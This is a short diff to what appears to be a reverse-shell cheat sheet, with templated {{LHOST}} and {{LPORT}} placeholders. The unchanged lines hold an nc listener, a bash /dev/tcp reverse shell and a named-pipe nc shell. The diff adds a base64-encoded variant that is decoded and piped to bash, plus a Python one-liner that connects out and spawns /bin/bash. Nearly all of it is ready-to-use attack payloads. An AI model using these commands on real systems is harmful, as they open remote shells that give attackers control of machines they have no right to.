@@ -156,6 +156,13 @@ nc -lvnp {{LPORT}}
 bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1
 # if /dev/tcp is unavailable, use a named pipe
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc {{LHOST}} {{LPORT}} > /tmp/f
+
+# Try base 64 
+echo 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1' | base64
+echo {{ENCODED}} | base64 -d | bash
+
+# Try python 
+python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{LHOST}}\",{{LPORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"
 ```
 
 ```powershell
